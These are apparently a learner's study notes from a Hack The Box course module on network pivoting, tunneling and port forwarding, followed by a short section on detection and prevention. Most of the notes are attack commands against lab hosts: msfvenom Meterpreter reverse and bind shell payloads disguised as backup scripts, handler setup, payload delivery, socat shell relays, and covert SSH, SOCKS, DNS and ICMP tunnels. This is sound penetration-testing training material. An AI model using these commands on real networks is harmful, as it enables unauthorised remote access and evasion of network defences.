![[Pasted image 20250210083251.png]]

Pivoting is essentially the idea of `moving to other networks through a compromised host to find more targets on different network segments`.

#### Tunneling

- encapsulate network traffic into another protocol and route traffic through it
- typical examples are VPNs or specialized browser

## Lateral Movement, Pivoting, and Tunneling Compared

#### Lateral Movement

One practical example of `Lateral Movement` would be:

>During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further.

#### Pivoting

# The Networking Behind Pivoting

>[!IMPORTANT]
>This is why it is important for us to always check for additional NICs using commands like `ifconfig` (in macOS and Linux) and `ipconfig` (in Windows).

#### ROUTING table on pwnbox
```shell
netstat -r
```

# Dynamic Port Forwarding with SSH and SOCKS Tunneling

## SSH Local Port Forwarding

![[Pasted image 20250210090420.png]]


#### Executing the Local Port Forward

```shell
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

>The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server.

#### Confirming Port Forward with Netstat

```shell
netstat -antp | grep 1234
```
#### Confirming Port Forward with Nmap

```shell
nmap -v -sV -p1234 localhost
```
![[Pasted image 20250210091316.png]]

#### Enabling Dynamic Port Forwarding with SSH

```shell
ssh -D 9050 ubuntu@10.129.202.64
```

> -D enables dynamic port forwarding

Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host

>[!important]
>To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.

#### Using Nmap with Proxychains

```shell
proxychains nmap -v -sn 172.16.5.1-200
```

>[!note]
>One more important note to remember here is that we can only perform a `full TCP connect scan` over proxychains.

```shell
proxychains msfconsole
```

# Remote/Reverse Port Forwarding with SSH

![[Pasted image 20250210104615.png]]
#### Creating a Windows Payload with msfvenom
```shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

#### Configuring & Starting the multi/handler

```shell
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set lhost 0.0.0.0

msf6 exploit(multi/handler) > set lport 8000

msf6 exploit(multi/handler) > run

```

#### Transferring Payload to Pivot Host

```shell
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

#### Downloading Payload on the Windows Target
```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

`SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

```shell
alenn@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

![[Pasted image 20250210105235.png]]

# Meterpreter Tunneling & Port Forwarding

#### Creating Payload for Ubuntu Pivot Host

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
after getiing shell on pivot host we can run attacks from our attacker host

```shell
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

#### Ping Sweep For Loop on Linux Pivot Hosts

```shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

###### in cmd
```cmd 
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

###### in pwsh 
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

#### Configuring MSF's SOCKS Proxy

alternative to ssh port forwarding


```shell
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
```
#### Confirming Proxy Server is Running

```shell-session
msf6 auxiliary(server/socks_proxy) > jobs
```

#### Creating Routes with AutoRoute

```shell-session
msf6 > use post/multi/manage/autoroute

set SESSION 1

msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.

```

>[!note]
>It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```shell
meterpreter > run autoroute -s 172.16.5.0/23
```

#### Listing Active Routes with AutoRoute

```shell
meterpreter > run autoroute -p
```

#### Testing Proxy & Routing Functionality
```shell
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

## Port Forwarding
#### Creating Local TCP Relay

```shell
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

 attack host's local port (`-l`) `3300`
 remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session

>Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

## Meterpreter Reverse Port Forwarding

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
 This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`

# Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.

```shell
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
#### Creating the Windows Payload
```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

# Socat Redirection with a Bind Shell

![[Pasted image 20250210142611.png]]

#### Creating the Windows Payload

on attack host
```shell
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

transfer to pivot host
transfer to target host

```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
# SSH for Windows: plink.exe

![[Pasted image 20250210143207.png]]

```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```

# SSH Pivoting with Sshuttle

```shell
sudo apt-get install sshuttle
```

```shell
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

# Web Server Pivoting with Rpivot

```shell
git clone https://github.com/klsecservices/rpivot.git
sudo apt-get install python2.7
```
#### Running server.py from the Attack Host
```shell
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

#### Transfering rpivot to the Target

```shell
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
#### Running client.py from Pivot Target
```shell
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

# Port Forwarding with Windows Netsh

![[Pasted image 20250211144039.png]]
#### Using Netsh.exe to Port Forward

```cmd
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```
#### Verifying Port Forward

```cmd
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```

# DNS Tunneling with Dnscat2

DNSCAT2 - https://github.com/iagox86/dnscat2

#### Starting the dnscat2 server

```shell
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.

#### Cloning dnscat2-powershell to the Attack Host
```shell-session
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Transfer to the pivot host
#### Importing dnscat2.ps1

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1
```

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

# SOCKS5 Tunneling with Chisel

```shell
 git clone https://github.com/jpillora/chisel.git
```

```shell
cd chisel
go build
```

shrinking the binary of chisel 
https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s
#### Running the Chisel Server on the Pivot Host
```shell
./chisel server -v -p 1234 --socks5
```
#### Connecting to the Chisel Server
```shell
./chisel client -v 10.129.202.64:1234 socks
```

```shell-session
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
```

have to add the port from here to proxychains.conf

## Chisel Reverse Pivot

#### Starting the Chisel Server on our Attack Host

```shell-session
sudo ./chisel server --reverse -v -p 1234 --socks5
```

#### ON client

```shell
./chisel client -v 10.10.14.17:1234 R:socks
```

#### proxychains.conf

```shell
[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```


# ICMP Tunneling with SOCKS

https://github.com/utoni/ptunnel-ng

```shell
git clone https://github.com/utoni/ptunnel-ng.git
```
#### Building Ptunnel-ng with Autogen.sh
```shell
sudo ./autogen.sh 
```

#### Alternative approach of building a static binary

```shell-session
alenn@htb[/htb]$ sudo apt install automake autoconf -y
alenn@htb[/htb]$ cd ptunnel-ng/
alenn@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
alenn@htb[/htb]$ ./autogen.sh
```
#### Transferring Ptunnel-ng to the Pivot Host

```shell
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

#### Starting the ptunnel-ng Server on the Target Host

```shell
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

#### Connecting to ptunnel-ng Server from Attack Host
```shell
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```
#### Tunneling an SSH connection through an ICMP Tunnel

```shell
ssh -p2222 -lubuntu 127.0.0.1
```


#### Enabling Dynamic Port Forwarding over SSH

```shell
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

# RDP and SOCKS Tunneling with SocksOverRDP

#### Loading SocksOverRDP.dll using regsvr32.exe

```cmd
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
https://www.proxifier.com/download/ProxifierPE.zip

# Detection & Prevention

## Setting a Baseline

#### Things to Document and Track

- DNS records, network device backups, and DHCP configurations
- Full and current application inventory
- A list of all enterprise hosts and their location
- Users who have elevated permissions
- A list of any dual-homed hosts (More than one network interface)
- Keeping a visual network diagram of your environment
https://app.diagrams.net/ network doucmentation

## People, Processes, and Technology

#### People

- Enforcing security best practices for standard users and administrators
### BYOD and Other Concerns

Using `multi-factor authentication` (Something you have, something you know, something you are, location, etc.)

`SOC as a Service` to constantly monitor what is happening within the IT environment 24/7
So having a proper `incident response plan` ready is essential to be prepared for a breach.


### Processes

- Proper policies and procedures for asset monitoring and management
    - Host audits, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost
- Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms
- Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)
- Change management processes to formally document `who did what` and `when they did it`

## From the Outside Moving In

#### Perimeter First

- `What exactly are we protecting?`
- `What are the most valuable assets the organization owns that need securing?`
- `What can be considered the perimeter of our network?`
- `What devices & services can be accessed from the Internet? (Public-facing)`
- `How can we detect & prevent when an attacker is attempting an attack?`
- `How can we make sure the right person &/or team receives alerts as soon as something isn't right?`
- `Who on our team is responsible for monitoring alerts and any actions our technical controls flag as potentially malicious?`
- `Do we have any external trusts with outside partners?`
- `What types of authentication mechanisms are we using?`
- `Do we require Out-of-Band (OOB) management for our infrastructure. If so, who has access permissions?`
- `Do we have a Disaster Recovery plan?`

- External interface on a firewall
    - Next-Gen Firewall Capabilities
        - Blocking suspicious connections by IP
        - Ensuring only approved individuals are connecting to VPNs
        - Building the ability to quick disconnect suspicious connections without disrupting business functions


#### Internal Considerations

- `Are any hosts that require exposure to the internet properly hardened and placed in a DMZ network?`
- `Are we using Intrusion Detection and Prevention systems within our environment?`
- `How are our networks configured? Are different teams confined to their own network segments?`
- `Do we have separate networks for production and management networks?`
- `How are we tracking approved employees who have remote access to admin/management networks?`
- `How are we correlating the data we are receiving from our infrastructure defenses and end-points?`
- `Are we utilizing host-based IDS, IPS, and event logs?`
- [Enterprise](https://app.hackthebox.com/machines/Enterprise) [IPPSec Walkthrough](https://youtube.com/watch?v=NWVJ2b0D1r8&t=2400)
- [Inception](https://app.hackthebox.com/machines/Inception) [IPPSec Walkthrough](https://youtube.com/watch?v=J2I-5xPgyXk&t=2330)
- [Reddish](https://app.hackthebox.com/machines/Reddish) [IPPSec Walkthrough](https://youtube.com/watch?v=Yp4oxoQIBAM&t=2466) This host is quite a challenge.
### what now

#### ProLabs

`Pro Labs` are large simulated corporate networks that teach skills applicable to real-life penetration testing engagements. The `Dante` Pro Lab is an excellent place to practice chaining our pivoting skills together with other enterprise attack knowledge. The `Offshore` and `RastaLabs` Pro Labs are intermediate-level labs that contain a wealth of opportunities for practicing pivoting through networks.

- [RastaLabs](https://app.hackthebox.com/prolabs/overview/rastalabs) Pro Lab
- [Dante](https://app.hackthebox.com/prolabs/overview/dante) Pro Lab
- [Offshore](https://app.hackthebox.com/prolabs/overview/offshore) Pro Lab

## to read
https://0xdf.gitlab.io/

https://0xdf.gitlab.io/cheatsheets/

https://rastamouse.me/